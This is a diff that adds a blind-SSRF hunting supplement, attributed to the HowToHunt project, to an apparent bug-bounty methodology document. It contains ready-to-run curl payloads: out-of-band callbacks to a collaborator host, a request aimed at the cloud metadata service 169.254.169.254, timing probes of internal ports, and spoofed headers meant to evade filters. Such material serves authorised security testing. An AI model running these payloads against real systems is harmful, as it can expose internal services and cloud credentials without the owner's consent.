@@ -126,6 +126,32 @@ wait
 - `attack_script ssrf_listener` — OOB callback listener
 - `curl` — manual SSRF testing
 
+## HowToHunt Advanced Supplement — Blind SSRF
+
+> **Source:** [KathanP19/HowToHunt — SSRF / Blind_SSRF](https://github.com/KathanP19/HowToHunt/tree/master/SSRF) by multiple contributors. Licensed GPL-3.0.
+
+Blind SSRF has no direct response; use OOB and timing:
+
+```bash
+# OOB via collaborator (preferred)
+curl "https://target.com/fetch?url=http://YOUR_COLLABORATOR.burpcollaborator.net"
+# Check collaborator for DNS/HTTP hit — confirms SSRF even without response
+
+# DNS exfiltration for cloud metadata
+curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/hostname.YOUR_COLLABORATOR.net"
+
+# Time-based blind (no OOB)
+# If server fetches internal port, response time differs
+time curl "https://target.com/fetch?url=http://127.0.0.1:22/" # SSH banner vs closed port timing
+
+# Header-based SSRF (often missed) — reuse WAF bypass headers
+for hdr in "X-Forwarded-For: 169.254.169.254" "X-Real-IP: 169.254.169.254"; do
+  curl -H "$hdr" "https://target.com/api/fetch?url=http://internal/"
+done
+```
+
+For blind cases, evidence is the collaborator hit or timing delta, not response body. Pair with `howtohunt-waf-bypass` headers for filter evasion.
+
 ## References
 
 - [PortSwigger: SSRF](https://portswigger.net/web-security/ssrf)
